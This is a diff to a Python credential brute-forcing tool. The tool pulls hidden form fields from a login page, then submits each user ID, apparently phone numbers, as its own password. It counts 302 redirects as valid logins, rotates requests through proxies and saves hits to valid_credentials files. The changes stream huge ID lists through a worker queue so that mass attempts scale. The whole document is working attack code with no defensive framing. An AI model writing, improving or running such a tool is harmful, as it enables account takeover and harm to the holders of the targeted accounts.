@@ -53,7 +53,6 @@ class ResultsManager:
 
     def __init__(self, output_file: str = "valid_credentials.txt"):
         self.output_file = output_file
-        self.results = []
         self.lock = asyncio.Lock()
 
     async def save_valid(self, user_id: str, additional_info: Dict = None):
@@ -68,16 +67,14 @@ class ResultsManager:
             if additional_info:
                 result.update(additional_info)
 
-            self.results.append(result)
-
             # Append to text file
             with open(self.output_file, 'a', encoding='utf-8') as f:
                 f.write(f"[{timestamp}] Valid: {user_id}\n")
 
-            # Save JSON format
-            json_file = self.output_file.replace('.txt', '.json')
-            with open(json_file, 'w', encoding='utf-8') as f:
-                json.dump(self.results, f, indent=2, ensure_ascii=False)
+            # Append to JSON file (one JSON per line for memory efficiency)
+            json_file = self.output_file.replace('.txt', '.jsonl')
+            with open(json_file, 'a', encoding='utf-8') as f:
+                f.write(json.dumps(result, ensure_ascii=False) + '\n')
 
 
 class Statistics:
@@ -135,15 +132,11 @@ class Checker:
         }
 
         connector = None
-        if proxy:
-            if proxy.startswith('socks'):
-                if ProxyConnector is None:
-                    console.print("[yellow]⚠ SOCKS proxy requested but aiohttp-socks not installed[/yellow]")
-                else:
-                    connector = ProxyConnector.from_url(proxy)
+        if proxy and proxy.startswith('socks'):
+            if ProxyConnector is None:
+                console.print("[yellow]⚠ SOCKS proxy requested but aiohttp-socks not installed[/yellow]")
             else:
-                # HTTP/HTTPS proxy
-                pass
+                connector = ProxyConnector.from_url(proxy)
 
         timeout_config = aiohttp.ClientTimeout(total=self.timeout)
 
@@ -154,10 +147,6 @@ class Checker:
             trust_env=True
         )
 
-        # Set proxy for HTTP/HTTPS if not SOCKS
-        if proxy and not proxy.startswith('socks'):
-            session._proxy = proxy
-
         return session
 
     async def close_all_sessions(self):
@@ -166,11 +155,13 @@ class Checker:
             await session.close()
         self.sessions.clear()
 
-    async def parse_hidden_inputs(self, session: aiohttp.ClientSession) -> Optional[Dict]:
+    async def parse_hidden_inputs(self, session: aiohttp.ClientSession, proxy: Optional[str] = None) -> Optional[Dict]:
         """Parse hidden inputs from page"""
         try:
-            proxy = session._proxy if hasattr(session, '_proxy') else None
-            async with session.get(self.api_url, proxy=proxy) as response:
+            # Для SOCKS прокси используется connector, для HTTP/HTTPS - параметр proxy
+            proxy_param = proxy if proxy and not proxy.startswith('socks') else None
+
+            async with session.get(self.api_url, proxy=proxy_param) as response:
                 if response.status == 200:
                     html = await response.text()
                     soup = BeautifulSoup(html, 'lxml')
@@ -197,8 +188,8 @@ class Checker:
 
             session = self.sessions[session_key]
 
-            # Parse hidden inputs
-            hidden_inputs = await self.parse_hidden_inputs(session)
+            # Parse hidden inputs (передаем proxy для правильной работы)
+            hidden_inputs = await self.parse_hidden_inputs(session, proxy)
             if not hidden_inputs:
                 raise Exception("Failed to retrieve hidden inputs")
 
@@ -220,8 +211,8 @@ class Checker:
                 ("TextPassword", user_id)
             )
 
-            # Make request
-            proxy_param = session._proxy if hasattr(session, '_proxy') else None
+            # Make request (для SOCKS прокси используется connector, для HTTP/HTTPS - параметр proxy)
+            proxy_param = proxy if proxy and not proxy.startswith('socks') else None
             async with session.post(self.api_url, data=form, allow_redirects=False, proxy=proxy_param) as response:
                 if response.status == 302:
                     # Valid credentials found
@@ -249,74 +240,180 @@ class Checker:
 
 
 class BruteForcer:
-    """Main bruteforce orchestrator"""
+    """Main bruteforce orchestrator with streaming support for large files"""
 
     def __init__(
         self,
-        user_ids: List[str],
+        user_id_source,
+        total_count: Optional[int] = None,
         max_workers: int = 10,
         proxy_manager: Optional[ProxyManager] = None,
         results_manager: Optional[ResultsManager] = None,
         max_retries: int = 3,
         timeout: int = 30
     ):
-        self.user_ids = user_ids
+        self.user_id_source = user_id_source
+        self.total_count = total_count
         self.max_workers = max_workers
         self.semaphore = asyncio.Semaphore(max_workers)
         self.checker = Checker(proxy_manager, results_manager, max_retries, timeout)
-        self.checker.stats.total = len(user_ids)
+        self.checker.stats.total = total_count or 0
+        self.queue = asyncio.Queue(maxsize=max_workers * 2)  # Buffer size
+        self.stop_event = asyncio.Event()
 
-    async def process_user_id(self, user_id: str, progress: Progress, task_id):
-        """Process single user ID with semaphore"""
-        async with self.semaphore:
-            result = await self.checker.check_credential(user_id)
-            progress.update(task_id, advance=1)
+    async def producer(self):
+        """Read user IDs from source and put into queue"""
+        try:
+            if isinstance(self.user_id_source, str):
+                # File path - stream reading
+                with open(self.user_id_source, 'r', encoding='utf-8', buffering=8192*16) as f:
+                    for line in f:
+                        user_id = line.strip()
+                        if user_id:
+                            await self.queue.put(user_id)
+            else:
+                # List of user IDs
+                for user_id in self.user_id_source:
+                    await self.queue.put(user_id)
+        finally:
+            # Signal workers to stop
+            for _ in range(self.max_workers):
+                await self.queue.put(None)
 
-            if result:
-                console.print(f"[green]✓[/green] Valid: [bold green]{user_id}[/bold green]")
+    async def worker(self, progress: Progress, task_id):
+        """Worker that processes user IDs from queue"""
+        while not self.stop_event.is_set():
+            user_id = await self.queue.get()
 
-            return result
+            if user_id is None:  # Stop signal
+                self.queue.task_done()
+                break
+
+            try:
+                result = await self.checker.check_credential(user_id)
+
+                if result:
+                    console.print(f"[green]✓[/green] Valid: [bold green]{user_id}[/bold green]")
+
+                progress.update(task_id, advance=1)
+            finally:
+                self.queue.task_done()
 
     async def run(self):
-        """Run the bruteforce process"""
+        """Run the bruteforce process with streaming"""
+        total_display = f"{self.total_count}" if self.total_count else "Unknown"
         console.print(Panel.fit(
             "[bold cyan]Advanced Credential Testing Tool[/bold cyan]\n"
-            f"Total targets: {len(self.user_ids)} | Workers: {self.max_workers}",
+            f"Total targets: {total_display} | Workers: {self.max_workers}\n"
+            "[dim]Press Ctrl+C to stop gracefully[/dim]",
             border_style="cyan"
         ))
 
-        with Progress(
-            SpinnerColumn(),
-            TextColumn("[progress.description]{task.description}"),
-            BarColumn(),
-            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-            TextColumn("({task.completed}/{task.total})"),
-            TimeRemainingColumn(),
-            console=console
-        ) as progress:
-            task = progress.add_task("[cyan]Checking credentials...", total=len(self.user_ids))
+        producer_task = None
+        worker_tasks = []
 
-            tasks = [
-                self.process_user_id(user_id, progress, task)
-                for user_id in self.user_ids
-            ]
+        try:
+            with Progress(
+                SpinnerColumn(),
+                TextColumn("[progress.description]{task.description}"),
+                BarColumn(),
+                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+                TextColumn("({task.completed}/{task.total})"),
+                TimeRemainingColumn(),
+                console=console
+            ) as progress:
+                task = progress.add_task(
+                    "[cyan]Checking credentials...",
+                    total=self.total_count if self.total_count else None
+                )
 
-            await asyncio.gather(*tasks)
+                # Start producer and workers
+                producer_task = asyncio.create_task(self.producer())
+                worker_tasks = [
+                    asyncio.create_task(self.worker(progress, task))
+                    for _ in range(self.max_workers)
+                ]
 
-        await self.checker.close_all_sessions()
+                # Wait for producer to finish
+                await producer_task
 
-        # Display final statistics
-        console.print("\n")
-        console.print(Panel(
-            self.checker.stats.get_stats_table(),
-            title="[bold cyan]Final Statistics[/bold cyan]",
-            border_style="cyan"
-        ))
+                # Wait for all items to be processed
+                await self.queue.join()
+
+                # Wait for workers to stop
+                await asyncio.gather(*worker_tasks)
+
+        except asyncio.CancelledError:
+            console.print("\n[yellow]⚠ Cancelling tasks...[/yellow]")
+            raise
+
+        except KeyboardInterrupt:
+            console.print("\n[yellow]⚠ Interrupted by user. Stopping gracefully...[/yellow]")
+
+            # Signal workers to stop
+            self.stop_event.set()
+
+            # Cancel producer if still running
+            if producer_task and not producer_task.done():
+                producer_task.cancel()
+                try:
+                    await producer_task
+                except asyncio.CancelledError:
+                    pass
+
+            # Cancel all workers
+            for task in worker_tasks:
+                if not task.done():
+                    task.cancel()
+
+            # Wait for workers to finish with timeout
+            if worker_tasks:
+                try:
+                    await asyncio.wait_for(
+                        asyncio.gather(*worker_tasks, return_exceptions=True),
+                        timeout=5.0
+                    )
+                except asyncio.TimeoutError:
+                    console.print("[yellow]⚠ Force stopping workers...[/yellow]")
+
+        finally:
+            # Always close sessions
+            await self.checker.close_all_sessions()
+
+            # Display final statistics
+            console.print("\n")
+            console.print(Panel(
+                self.checker.stats.get_stats_table(),
+                title="[bold cyan]Final Statistics[/bold cyan]",
+                border_style="cyan"
+            ))
+
+
+def count_lines_fast(filepath: str) -> Optional[int]:
+    """Fast line counting for large files (optional, for progress bar)"""
+    try:
+        console.print("[yellow]Counting lines in file (press Ctrl+C to skip)...[/yellow]")
+        count = 0
+        with open(filepath, 'rb') as f:
+            buffer_size = 1024 * 1024 * 8  # 8MB buffer
+            while True:
+                buffer = f.read(buffer_size)
+                if not buffer:
+                    break
+                count += buffer.count(b'\n')
+        console.print(f"[green]Found {count:,} lines[/green]")
+        return count
+    except KeyboardInterrupt:
+        console.print("\n[yellow]⚠ Line counting interrupted. Starting without progress tracking...[/yellow]")
+        return None
+    except Exception as e:
+        console.print(f"[yellow]⚠ Could not count lines: {e}[/yellow]")
+        return None
 
 
 async def main():
     parser = argparse.ArgumentParser(
-        description="Advanced Multi-threaded Credential Testing Tool",
+        description="Advanced Multi-threaded Credential Testing Tool (Optimized for Large Files)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -324,6 +421,7 @@ Examples:
   %(prog)s -f users.txt -p proxies.txt -w 50
   %(prog)s -u 01911105338 01922334455
   %(prog)s -f users.txt --proxy-file proxies.txt --output results.txt
+  %(prog)s -f huge_file.txt -w 100 --no-count  # Skip line counting for faster startup
         """
     )
 
@@ -334,26 +432,34 @@ Examples:
     parser.add_argument('-o', '--output', default='valid_credentials.txt', help='Output file for valid credentials')
     parser.add_argument('-r', '--retries', type=int, default=3, help='Max retries per request (default: 3)')
     parser.add_argument('-t', '--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')
+    parser.add_argument('--no-count', action='store_true', help='Skip counting lines (faster startup for huge files)')
 
     args = parser.parse_args()
 
-    # Load user IDs
-    user_ids = []
+    # Prepare user ID source
+    user_id_source = None
+    total_count = None
+
     if args.file:
         if not Path(args.file).exists():
             console.print(f"[red]✗ File not found: {args.file}[/red]")
             sys.exit(1)
-        with open(args.file, 'r') as f:
-            user_ids = [line.strip() for line in f if line.strip()]
+
+        # Use file path directly for streaming (don't load into memory)
+        user_id_source = args.file
+
+        # Optionally count lines for progress tracking
+        if not args.no_count:
+            total_count = count_lines_fast(args.file)
+        else:
+            console.print("[yellow]Skipping line count (--no-count flag)[/yellow]")
+
     elif args.users:
-        user_ids = args.users
+        user_id_source = args.users
+        total_count = len(args.users)
     else:
         console.print("[red]✗ Please provide user IDs via -f or -u[/red]")
         parser.print_help()
-        sys.exit(1)
-
-    if not user_ids:
-        console.print("[red]✗ No user IDs to check[/red]")
         sys.exit(1)
 
     # Initialize proxy manager
@@ -364,7 +470,8 @@ Examples:
 
     # Create and run bruteforcer
     bruteforcer = BruteForcer(
-        user_ids=user_ids,
+        user_id_source=user_id_source,
+        total_count=total_count,
         max_workers=args.workers,
         proxy_manager=proxy_manager,
         results_manager=results_manager,
@@ -372,14 +479,19 @@ Examples:
         timeout=args.timeout
     )
 
-    await bruteforcer.run()
-
-    console.print(f"\n[green]✓[/green] Results saved to: [bold]{args.output}[/bold]")
+    try:
+        await bruteforcer.run()
+        console.print(f"\n[green]✓[/green] Results saved to: [bold]{args.output}[/bold]")
+    except KeyboardInterrupt:
+        console.print(f"\n[yellow]⚠ Process interrupted. Partial results saved to: [bold]{args.output}[/bold][/yellow]")
 
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        console.print("\n[yellow]⚠ Interrupted by user[/yellow]")
-        sys.exit(0)
+        # Already handled in main()
+        sys.exit(130)  # Standard exit code for Ctrl+C
+    except Exception as e:
+        console.print(f"\n[red]✗ Fatal error: {e}[/red]")
+        sys.exit(1)
